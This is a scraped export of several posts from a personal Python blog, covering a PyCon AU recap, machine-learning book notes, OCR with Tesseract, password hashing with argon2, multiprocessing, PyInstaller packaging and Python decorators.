Shoutout to a guy (who doesn't have socials) that I met a pub that made me aware of Singularity , an alternative to docker, will have to do further research and testing on this one, so watch this space! Further to this, I was also made aware of the Gitflow Workflow , as using Git is admittedly one of my other weakpoints, so will definitely be trying to bring this principle into my development pipeline. My to-do list after Pycon Day 1 Write this blog post! Look into tilemill , Understand mutable and immutable better, Learn what super does in Python , Try make some generative art, Looking into papermill + jupyterlab , Have a go at using XGBoost and text, Get (much) better at testing with pytest , Look into structuring python projects better, Move this website to static html with netlify and more, Look into singularity , Look into GitFlow Workflow .","tags":"Python","url":"https://jackmckew.dev/pycon-au-2019-saturday-in-summary.html","loc":"https://jackmckew.dev/pycon-au-2019-saturday-in-summary.html"},{"title":"Hands On Machine Learning Chapter 2","text":"Chapter 2 is an end to end machine learning project, in which you pretend to be a recently hired data scientist for a real estate company. It cannot be emphasized enough that when learning about machine learning or any topic for that matter, it is best to actually experiment with real-world data and scenarios. Firstly my personal opinion on how a machine learning (or data science) project is structured is a series of steps: Get an understanding of the expected goal or outcome (eg frame the problem), Get an understanding of the current process (if there is one), Get the data behind the problem (or what you expect will be useful for solving the problem), Explore and visualize the data to gain insights, Prepare/massage the data ready for input into algorithms or models, Select a model/algorithm and train it, Tune your model/algorithm to the best you can, Present the solution to the original stakeholder (take the stakeholder on a journey), Launch, monitor and maintain your system. I believe, that if you follow these steps at a minimum, you will find success with your data science/machine learning projects. This methodology also applies for any type of project and can be enhanced with tweaks where you see fit. Anyway, back to Chapter 2, it is very much so reinforced that you should select an appropriate way of scoring performance of your algorithms/models (otherwise you can't compare them effectively). For regression tasks, generally the preferred performance measure is RMSE (Root Mean Square Error), but this may not always be the case depending on the context of the problem. For example, if the data set has many outliers (or outlier groups), it may prove beneficial to consider MAE (Mean Absolute Error). Assumptions are in my opinion, the downfall of any collaborative project if they are not transparent or communicated. A practice that I personally do and recommend doing is to try your best to document every assumption you may make in a project, such that anyone later on can pick up where you were and understand why you chose to do something a certain way. As per Chapter 1, it is again reinforced to split your data set up into a training set, a testing set and a validation set; albeit a more practical example of this concept in action. Whereas you use the K-fold validations with GridSearchCV to understand the best performing hyper parameters for your algorithm/model. Personally, in Chapter 2, the most difficult part to understand is around the pipeline for preparing data ready for use in algorithms/models. Pipelines are essentially a sequence of steps that need to be completed in order before the data is ready. Stemming from the Scikit-learn design principles, I found this the best way to understand the possible steps in a data preparation pipeline: Estimators Any object that estimates parameters based on a data set is known as an Estimator. For example, if you had a data set with lots of missing values, you could estimate what to fill these gaps with an imputer, then you could choose to use the median of the dataset if appropriate. Transformers Any object that transformers a data set is known as a Transformer. For example, if you wanted to now fill those gaps in the data set previously mentioned with the mean, you would use a transformer to 'insert' the median wherever empty values were found. Predictors Any object that is capable of making predictions given a dataset is known as a Predictor. For example, a linear regression model is a predictor, using one feature to extrapolate another feature.","tags":"Machine Learning","url":"https://jackmckew.dev/hands-on-machine-learning-chapter-2.html","loc":"https://jackmckew.dev/hands-on-machine-learning-chapter-2.html"},{"title":"Python and OCR","text":"This post will demonstrate how to extract the text out of a photo, whether it being handwritten, typed or just a photo of text in the world using Python and OCR (Optical Character Recognition). While this is something that humans do particularly well at distinguishing letters, it is a form of semi-structured data. OCR just like humans also has it's limitations, for example, if you were trying to read someone with really difficult handwriting, it could be a big challenge. In this post, we will use the Tesseract engine (an open source Google project) to undertake the OCR process for us. First of all, as always, we must create a new virtual environment for our project to live in or use a package manager such as Anaconda (as explained in my post Episode - 8: Anaconda . Once initialized, we want to install a few packages to help us on our quest for OCR. Both Pillow and PyTesseract , if you are using Anaconda like I did, you will want to specifically use pip, not conda, to install these packages. Further to this, you will need to install the binary of the Tesseract-OCR engine, which installation instructions can be found: https://github.com/UB-Mannheim/tesseract/wiki . Now we are finally ready to test the engine and see if we can extract text out of an image, first of all we will start with a 'well' written example, the 'logo' of this website! Of course, we have still yet to write any code, so naturally, that is the next step. As always in a python project, you will need to import all the dependencies of the project, in this case, it will be Image from the PIL (pillow) package, and pytesseract (the python wrapper around the Tesseract Engine). 1 2 from PIL import Image import pytesseract Now that we have our dependencies loaded, it's time to check out the documentation behind Pillow and pytesseract to know how to operate the tools, consider these an instruction manual. The documentation for these tools can be found: Pillow , PyTesseract . Luckily for us, the developers have made this so simple it could be a one liner: 1 print ( pytesseract . image_to_string ( Image . open ( 'images/example.png' ))) Which outputs in the console from the example image above: JACK MCKEW'S\\ BLOG\\ Python enthusiast, electrical engineer and\\ tinkerer Great! We can confirm that the text that the tesseract engine detected, is in fact, exactly what the example we gave it was. However, let's go a bit out of the way to make this a function such that it can be called more easily with the filepath to the image as a string. 1 2 3 4 5 6 7 8 9 10 from PIL import Image import pytesseract def ocr_convert_to_text ( filename ): text = pytesseract . image_to_string ( Image . open ( filename )) return text extracted_text = ocr_convert_to_text ( 'images/example.png' ) print ( extracted_text ) Now we have a function that we can call with a file path to easily convert our images to text. Now let's give the tesseract engine a bit of challenge with a full page of handwritten text: Ad Bb Cc Da Fe FEF Ge Hh Ii IS RR lt Hm We\\ 00 PP Ag Rr SsT# Uu Vv Ww Xx 44 Le\\ Aa BS (36 72 Re bebe nme #% Ua ti ke\\ At Au Hee Bo In Fn Le Sim \\ \\(y Rep Ha Wy\\ Ye Unu Uppy bb otn tx 79 Ww 2A\\ Sr be Liki 4\\ IR AS67890\\ so cool! New \\|neerndtinas release of mast\\ famous APP for exhorting Printed text 40\\ handwritten \"Sinyak\\ PacK mY box with. five dozen uguor Jugs\\ Don't 62 @. Earn \\\\) & Put 12 Jar.\\ Ingredienes: Zuss, Chis, CAR Lid.\\ (SÃ©crez info), kndw tb. 3\\ Wo xr dA h-(H4+F 060 Cheah]\\ ChiP & Dae.\" fava ys ie m4 mind.\\ Jackdaws uve m4 bi? sPhinx Of quare 2.\\ The five boxing withrds JumP quick.\\ How vexiegi quick date 2ebras sump!\\ {0.0} ainsa & crepim pa. bau! -) Using the same code, we were able to determine most of the text out of the picture that the tesseract engine was given. Obviously this is not perfect, but it is a whole lot easier than typing it all in by hand. For a bit of another challenge and to demonstrate the capabilities, let's try some Australian number plates: (CSE) XcB-962 (66M-059\\ X2ZH:709) EEH:133) (GAA729) Obviously this can and has had a big impact on the way people can utilize images to make their life easier, from scanning in your handwritten notes at school and converting straight on to the computer, to being able to add all the contact information in your phone from a business card. How can OCR help your life at work or at home? Please let me know in the comments.. if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"Python","url":"https://jackmckew.dev/python-and-ocr.html","loc":"https://jackmckew.dev/python-and-ocr.html"},{"title":"Python and Data Security (Hashing Algorithms)","text":"Data security is becoming more and more prevalent in today's society than ever before. We must make a conscious effort to secure both our physical lives, but also our digital lives as well. With data privacy, sharing of information and access control becoming integrated into most people's life in some way or another. Since this topic is so wide and deep, this will most likely become a series of posts as I am passionate around data security and enjoy getting stuck right into the math behind it. This post will be around hashing algorithms but future topics will include: Hashing Algorithms (this post), Modular Arithmetic and why it's used, Securely sharing keys, Methods of encryption, Methods of data security, Analyzing security weaknesses, Many more. As above, this post is dedicated to hashing algorithms and how to interface with them with Python for data security. What is a Hashing Algorithm The sole purpose of a hashing algorithm is to generate a safe hash which in turn raises the questions of what is a hash and what makes it safe? A hash is a value computed from a base input number using a hashing function. With a hashing function being: A hash function is any function that can be used to map data of arbitrary size onto data of a fixed size. https://en.wikipedia.org/wiki/Hash_function The hashing algorithm is intrinsically designed to be a one-way function, meaning it is impractical to revert. Although, as history has shown, as computing advances are made hashing algorithms are becoming compromised. A prime example of this being the MD5 algorithm, which was designed and used a cryptographic hash function (data security), but is now so simply reverse, that it is used for verifying data transfers. There are certain characteristics around what the perfect or ideal hash function for data security should possess: Easy/speed of computation, Impossible/impractical to regenerate source data/message (brute force as only option), Unique hashes for data (also known as hash collisions when there are duplicate hashes), Any change is source data should change the hash value (known as the avalanche effect). What is hashing used for in practice Hashing algorithms for data security in the real world is used in a variety of situations from ensuring files were successfully delivered correctly or to store sensitive/private information. If you are reading this, I can almost guarantee that you have some interface with a hashing algorithm right now! Whether it be how you're password is stored to indexing data in a database. Using hashes with Python This will be a simple use-case of a hashing algorithm using Python to securely convert passwords and how to verify against them (storing the hashed data is it's own beast in itself). Please note I will be utilizing the passlib package which contains over 30 password hashing algorithms, as well as a framework for managing existing password hashes. First of all we must select a hashing algorithm to use, to help with this from the team at passlib they have provided a basic guideline of questions : Does the hash need to be natively supported by your operating system's crypt() api,in order to allow inter-operation with third-party applications on the host? If yes, the right choice is either bcrypt for BSD variants,or sha512_crypt for Linux; since these are natively supported. If no, continue... Does your hosting provider allow you to install C extensions? If no, you probably want to use pbkdf2_sha256 ,as this currently has the fastest pure-python backend. If they allow C extensions, continue... Do you want to use the latest & greatest, and don't mind increased memory usage when hashing? argon2 is a next-generation hashing algorithm,attempting to become the new standard. It's design has been being slightly tweaked since 2013, but will quite likely become the standard in the next few years. You'll need to install the argon2_cffi support library. If you want something secure, but more battle tested, continue... The top choices left are bcrypt and pbkdf2_sha256 . Both have advantages, and their respective rough edges; though currently the balance is in favor of bcrypt (pbkdf2 can be cracked somewhat more efficiently). If choosing bcrypt, we strongly recommend installing the bcrypt support library on non-BSD operating systems. If choosing pbkdf2, especially on python2 \\< 2.7.8 and python 3 \\< 3.4, you will probably want to install fastpbk2 support library. From this, we will use the argon2 hashing algorithm. As normal, it is best practice to set up a virtual environment (or conda environment) and install the dependencies, in this case passlib. First of all, import the hashing algorithm you wish to use from the passlib package: 1 from passlib.hash import argon2 Following importing the hashing algorithm, to hash the password in our case is very simple and we can have a peak at what the output hash looks like: 1 2 3 hash = argon2 . hash ( \"super_secret_password\" ) print ( hash ) \\ \\(argon2i\\\\) v=19\\ \\(m=102400,t=2,p=8\\\\) NqY05lyrtdb6v/ee03pvrQ\\$mvLTquN71JPjuC+S9QNXYA The first section (\"\\ \\(argon2i\\\\) v=19\\ \\(m=102400,t=2,p=8\\\\) \") is the header information, showing the parameters that the algorithm used to generate the hash. While this seems as if it would make the algorithm easier to break, imagine a scenario where every password is hashed using an hashing algorithm with randomised parameters; verifying passwords would be a nightmare. Let's further break down what this represents: \\$argon2i - the variant of Argon2 algorithm being used, \\$v=19 - the version of Argon2 being used, \\$m=102400,t=2,p=8 - the memory (m), iterations (t) and parallelism (p) parameters being used, \\$NqY05lyrtdb6v/ee03pvrQ - the base64-encoded salt (added randomness), using standard base64 encoding and no padding, \\$mvLTquN71JPjuC+S9QNXYA - the base64-encoded hashed password (derived key), using standard base64 encoding and no padding. If we run this again, we can check that the outputs are completely different due to the randomly generated salt. 1 2 3 hash = argon2 . hash ( \"super_secret_password\" ) print ( hash ) \\ \\(argon2i\\\\) v=19\\ \\(m=102400,t=2,p=8\\\\) 8f4/x7hXitGacy6F8N67dw\\$/jPKQ98vLQCxkboxRlHa/g Now that we've generated our new passwords, stored them away in a secure database somewhere, using a secure method of communication somehow, our user wants to login with the password they signed up with (\"super_secret_password\") and we have to check if this is the correct password. To do this with passlib, it is as simply as calling the .verify function with the plaintext and the equivalent hash which will return a boolean value determining whether of not the password is correct or not. 1 print ( argon2 . verify ( \"super_secret_password\" , hash )) True Hooray! Our password verification system works, now we would like to check that if the user inputs a incorrect password that our algorithm returns correctly (false). 1 print ( argon2 . verify ( \"user_name\" , hash )) False Conclusion Hopefully this has given you some insight into what hashing algorithms are, how they are used and how to use them with Python. They can both be an extremely powerful tool for securing data, however, must always be revisited later on down the track as advancements are made and your system may now be compromised. if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"Python","url":"https://jackmckew.dev/python-and-data-security-hashing-algorithms.html","loc":"https://jackmckew.dev/python-and-data-security-hashing-algorithms.html"},{"title":"Hands On Machine Learning Chapter 1","text":"I've recently been making my way through the book \"Hands-On Machine Learning with Scikit-Learn and Tensorflow\", and thought I will put a summary of the chapter as a post, along with my personal answers to each of the chapter's exercises. The book in particular is published by O'Reilly and can be found https://www.oreilly.com/library/view/hands-on-machine-learning/9781491962282/ . Chapter 1 is around defining when and where to apply machine learning to a problem, as it is not always the best approach to solving a problem. Following, making sure to be aware of the strengths and weaknesses of each 'type' of machine learning systems. Types of machine learning systems can be broken into three broad categories: Is the model trained with human supervision? (supervised, unsupervised, semisupervised and reinforcement learning) Does the model learn incrementally on the fly or not? (online or batch learning) Does the model work by simply comparing new vs known data or detect patterns to build a prediction? (instance based or model based learning) The book then goes into detail around these, I will not as many resources around these topics are abundantly available on the internet. Chapter 1 also goes onto to detail the importance of defining the problem, 'clean' data, training vs testing data and comparing different techniques. From here on are the chapter 1 exercise questions, with my personal answer, and the book's answer. 1. How would you define Machine Learning? My answer: Self-sufficiently improving on a technique.\\ Book's answer: Machine Learning is about building systems that can learn from data. Learning means getting better at some task, given some performance measure. 2. Can you name four types of problems where it shines? My answer: Processes which either involve: many complex steps, steps that require 'tuning', ever-changing systems based on variables or to gain insight on a problem from a new perspective.\\ Book's answer: Machine Learning is great for complex problems for which we have no algorithmic solution, to replace long lists of hand-tuned rules, to build systems that adapt to fluctuating environments, and finally to help humans learn (e.g., data mining). 3. What is a labeled training set? My answer: A data set with the associated desired answer.\\ Book's answer: A labeled training set is a training set that contains the desired solution (a.k.a. alabel) for each instance. 4. What are the two most common supervised tasks? My answer: Regression and classification.\\ Book's answer: The two most common supervised tasks are regression and classification. 5. Can you name four common unsupervised tasks? My answer: Association rule learning, anomaly detection, simplification and clustering.\\ Book's answer: Common unsupervised tasks include clustering, visualization, dimensionality reduction, and association rule learning. 6. What type of Machine Learning algorithm would you use to allow a robot to walk in various unknown terrains? My answer; Reinforcement learning.\\ Book's answer: Reinforcement Learning is likely to perform best if we want a robot to learn to walk in various unknown terrains since this is typically the type of problem that Reinforcement Learning tackles. It might be possible to express the problem as a supervised or semisupervised learning problem, but it would be less natural. 7. What type of algorithm would you use to segment your customers into multiple groups? My answer: k-neighbour clustering.\\ Book's answer: If you don't know how to define the groups, then you can use a clustering algorithm (unsupervised learning) to segment your customers into clusters of similar customers. However, if you know what groups you would like to have, then you can feed many examples of each group to a classification algorithm (supervised learning), and it will classify all your customers into these groups . 8. Would you frame the problem of spam detection as a supervised learning problem or an unsupervised learning problem? My answer: Supervised or semisupervised.\\ Book's answer: Spam detection is a typical supervised learning problem: the algorithm is fed many emails along with their label (spam or not spam). 9. What is an online learning system My answer: A system that learns incrementally on the fly from new data.\\ Book's answer: An online learning system can learn incrementally, as opposed to a batch learning system. This makes it capable of adapting rapidly to both changing data and autonomous systems, and of training on very large quantities of data. 10. What is out-of-core learning? My answer: Whenever the data set is too large to fit on a single machine.\\ Book's answer: Out-of-core algorithms can handle vast quantities of data that cannot fit in a computer's main memory. An out-of-core learning algorithm chops the data into mini-batches and uses online learning techniques to learn from these minibatches. 11. What type of learning algorithm relies on a similarity measure to make predictions? My answer: Instance based learning (comparison of new vs old).\\ Book's answer: An instance-based learning system learns the training data by heart; then, when given a new instance, it uses a similarity measure to find the most similar learned instances and uses them to make predictions. 12. What is the difference between a model parameter and a learning algorithm's hyperparameter? My answer: A model parameter directly influences and influenced by the way the model behaves, while a hyperparameter is dictates how the model should behave (eg, learn fast or slow).\\ Book's answer: A model has one or more model parameters that determine what it will predict given a new instance (e.g., the slope of a linear model). A learning algorithm tries to find optimal values for these parameters such that the model generalizes well to new instances. A hyperparameter is a parameter of the learning algorithm itself, not of the model (e.g., the amount of regularization to apply). 13. What do model-based learning algorithms search for? What is the most common strategy they use to succeed? How do they make predictions? My answer: Relationships or trends within the data. Regression is used to find a possible solution to fit to the data and predictions are then extrapolated.\\ Book's answer: Model-based learning algorithms search for an optimal value for the model parameters such that the model will generalize well to new instances. We usually train such systems by minimizing a cost function that measures how bad the system is at making predictions on the training data, plus a penalty for model complexity if the model is regularized. To make predictions, we feed the new instance's features into the model's prediction function, using the parameter values found by the learning algorithm. 14. Can you name four of the main challenges in Machine Learning? My answer: Quality, quantity, irrelevant sections and incorrectly modeled.\\ Book's answer: Some of the main challenges in Machine Learning are the lack of data, poor data quality, nonrepresentative data, uninformative features, excessively simple models that underfit the training data, and excessively complex models that overfit the data 15. If your model performs great on the training data but generalizes poorly to new instances, what is happening? Can you name three possible solutions? My answer: Overfitted or underfitted to the data. Simplify the model, get more useful data and/or reduce noise.\\ Book's answer: If a model performs great on the training data but generalizes poorly to new instances, the model is likely overfitting the training data (or we got extremely lucky on the training data). Possible solutions to overfitting are getting more data, simplifying the model (selecting a simpler algorithm, reducing the number of parameters or features used, or regularizing the model), or reducing the noise in the training data. 16. What is a test set and why would you want to use it? My answer: A test set is used to understand how your model interacts with unseen data without having to collect new information.\\ Book's answer: A test set is used to estimate the generalization error that a model will make on new instances, before the model is launched in production. 17. What is the purpose of a validation set? My answer: To understand how accurate the system interfaces with unseen data.\\ Book's answer: A validation set is used to compare models. It makes it possible to select the best model and tune the hyperparameters. 18. What can go wrong if you tune hyperparameters using the test set? My answer: The system has been specifically setup to perform under these conditions and may perform unexpectedly in new situations.\\ Book's answer: If you tune hyperparameters using the test set, you risk overfitting the test set, and the generalization error you measure will be optimistic (you may launch a model that performs worse than you expect). 19. What is cross-validation and why would you prefer it to a validation set? My answer: By dividing the training set further into categories, then trained and validated against combinations of other categories.\\ Book's answer: Cross-validation is a technique that makes it possible to compare models (for model selection and hyperparameter tuning) without the need for a separate valiâ€ dation set. This saves precious training data.","tags":"Machine Learning","url":"https://jackmckew.dev/hands-on-machine-learning-chapter-1.html","loc":"https://jackmckew.dev/hands-on-machine-learning-chapter-1.html"},{"title":"Parallel Processing in Python","text":"Parallel processing is a mode of operation where the task is executed simultaneously in multiple processors in the same computer. The purpose of this is intended to reduce the overall processing time, however, there is often overhead between communicating processes. For small tasks, the overhead is detrimental to the length of processing, increasing the overall time taken. For this post we will be using the multiprocessing package in Python. Multiprocessing is apart of the standard library within Python and is a package that supports spawning processes using an API similar to the threading module (also apart of the standard library). The main benefit of the multiprocessing package, is that it disregards the global interpreter lock (GIL), by using sub processes instead of threads. The number of processors or threads in your computer dictates the maximum number of processes you can run at a time. To add flexibility to your program when it may be run across multiple machines, it is good practice to make use of the cpu_count() function apart of the multiprocessing, as shown below (please note f strings were only introduced in Python 3.6). 1 2 import multiprocessing as mp print ( f \"Maximum number of processes: { mp . cpu_count () } \" ) In parallel processing, there are two types of execution: Synchronous and Asynchronous. Synchronous meaning where the processes are completed in the same order in which it was started, such that, the output is (normally) in order. While asynchronous means the processes can be in any order, and while the output can be mixed, is usually computed faster. Within multiprocessing there are 2 main classes that you will use for parallel processing: Pool & Process. The two classes are intended to be used in completely different scenarios, but still utilize parallel processing. Pool is beneficial for when you have a long list that need to be processed and combined back together at the end. Process is beneficial for when you need multiple functions running simultaneously, albeit not the same. The Pool Class The pool class has four methods that are particular useful: Pool.apply Pool.map Pool.apply_async Pool.map_async Before we tackle the asynchronous variants of the pool methods (async suffix). Here is a simple example using Pool.apply and Pool.map. We initialize the number of processes to however many is available or the maximum of the system. 1 2 3 4 5 6 def power_n_minus_1 ( value ): return value ** value - 1 if __name__ == '__main__' : pool = mp . Pool ( processes = mp . cpu_count ()) results = [ pool . apply ( power_n_minus_1 , args = ( x ,)) for x in range ( 1 , 5 )] print ( results ) With the results being: [1, 2, 9, 64] or 1\\&#94;0, 2\\&#94;1,3\\&#94;2,4\\&#94;3. This can also be achieved similarly with Pool.map. 1 2 3 4 5 6 def power_n_minus_1 ( value ): return value ** value - 1 if __name__ == '__main__' : pool = mp . Pool ( processes = mp . cpu_count ()) results = pool . map ( power_n_minus_1 , range ( 1 , 5 )) print ( results ) Both of these will lock the main program that is calling them until all processes in the pool are finished, use this if you want to obtain results in a particular order. However if you don't care about the order and want to retrieve results as soon as they finished, then use the async variant. 1 2 3 4 5 6 7 def power_n_minus_1 ( value ): return value ** value - 1 if __name__ == '__main__' : pool = mp . Pool ( processes = mp . cpu_count ()) outputs = [ pool . apply_async ( power_n_minus_1 , args = ( x ,)) for x in range ( 1 , 5 )] results = [ p . get () for p in outputs ] print ( results ) The Process Class The process class is the most basic approach to parallel processing from multiprocessing package. Here we will use a simple queue function to generate 10 random numbers in parallel. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import multiprocessing as mp import random output = mp . Queue () def rand_number ( lower_limit , upper_limit , output ): output . put ( random . randint ( lower_limit , upper_limit )) if __name__ == \"__main__\" : processes = [ mp . Process ( target = rand_number , args = ( 1 , 101 , output )) for x in range ( 10 )] for p in processes : p . start () for p in processes : p . join () results = [ output . get () for p in processes ] print ( results ) With the result being: [76, 40, 76, 27, 64, 94, 30, 71, 70, 40]. By utilizing the multiprocessing package in Python or parallel computing concepts in general, you will now be able to dramatically increase computation times (for large processes).","tags":"Python","url":"https://jackmckew.dev/parallel-processing-in-python.html","loc":"https://jackmckew.dev/parallel-processing-in-python.html"},{"title":"Distributing Python Code","text":"This post will cover a way of distributing Python code such that is can be used by someone that does not have Python installed. One of the major drawbacks with Python that the gap is slowly being closed is how easy it is to distribute Python code. At a minimum, the computer that is to run the code must have the Python compiler (or equivalent). Now while this has been progressively included in more operating systems as a default (May update of Windows being the latest), you must still develop as such that is not present on the users' PC. For this post, I will show you a basic piece of code to demonstrate how it will be packaged and distributed to your users. To show a basic dialog box on the screen with the following code: 1 2 3 import ctypes ctypes . windll . user32 . MessageBoxW ( 0 , \"Hello Windows!\" , \"PyInstaller Example\" , 1 ) Which shows the user with this dialog box: Now to package this code into an executable (.exe), there are multiple packages out there that are possible to use, some examples of these are: cx_freeze py2exe PyInstaller For this post, I will use PyInstaller as it is what I am most familiar with, please get in touch with me if you believe any other package is better suited. I have created an environment in anaconda named \"pyinstall\", in which I have installed PyInstaller with the command \"conda install -c conda-forge pyinstaller\", which includes Python 3.7.3 due to anaconda's packaging system (thereby including ctypes from the standard library). Now to use the PyInstaller package, just open Anaconda Prompt (or cmd if anaconda.exe is in your PATH). Navigate to where the python code is stored, and run the command \"pyinstaller \\<name_of_program>.py. See below for an example: This will create a build & dist folder within the directory you navigated to, which contains the python application and all the required files will be put inside the dist folder which will be shipped to the user later on. There are many other settings that you can use to customize how your package gets built and more, but I won't go into that in this post. Now if we go into the dist folder and find the .exe (which will have the same name as your python file unless you change this setting). Once you hit run, you'll be met by this screen: Now you can send this executable to anyone (although most antivirus will stop you) and it will run on their PC!","tags":"Python","url":"https://jackmckew.dev/distributing-python-code.html","loc":"https://jackmckew.dev/distributing-python-code.html"},{"title":"Python Decorators Explained","text":"Python decorators are one of the most difficult concepts in Python to grasp, and subsequently a lot of beginners struggle. However they help to shorten code and make it more 'Pythonic'. This post is going to go through some basic examples where decorators can shorten your code. Firstly you have to understand functions within python: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 def hello ( name = 'Jack' ): return \"Hello \" + name print ( hello ()) # output: 'Hello Jack' greeting = hello # assign a function to a variable, with no parentheses as we are not calling it print ( greeting ()) # output: 'Hello Jack' del hello print ( hello ()) # output: NameError print ( greeting ()) # output: 'Hello Jack' As we can see above we can give functions default arguments (the string 'Jack' for the name variable in hello). Assign functions to variables (ensuring the parentheses are not included otherwise we would be assigning to the returning value from the function. Remove previous functions now that we have 'copied' the function over. Now to take the next step into functions within Python, by defining functions within functions: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 def hello ( name = 'Jack' ): print ( \"You're now inside the hello() function\" ) def greeting (): return \"Now you are in the greeting() function\" def welcome (): return \"Now you are in the welcome() function\" print ( greet ()) print ( welcome ()) print ( \"You are now back in the hello() function\" hello () # outputs: \"You're now inside the hello() function\" # \"Now you are in the greeting() function\" # \"Now you are in the welcome() function\" # \"You are now back in the hello() function\" welcome () # output: NameError: name 'welcome' is not defined Now we can make nested functions (functions within functions), the next step is, functions returning functions. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 def hello ( name = 'Jack' ): def greeting (): return \"Now you are in the greeting() function\" def welcome (): return \"Now you are in the welcome() function\" if ( name == 'Jack' ): return greeting else : return welcome returned_function = hello () print ( returned_function ) # output: <function greeting at 0x7f2143c01500> # This clearly shows that the returned function is the greeting() function within the hello() function print ( returned_function ()): # output: \"Now you are in the greeting() function\" From earlier, we know that if we don't include the parentheses then the function does not executed. Another extension of the way this is formatted is that we can now call hello()() which outputs \"Now you are in the greeting() function\". 1 2 3 4 5 6 7 8 9 10 def hello ( name = \"Jack\" ): return \"Hello 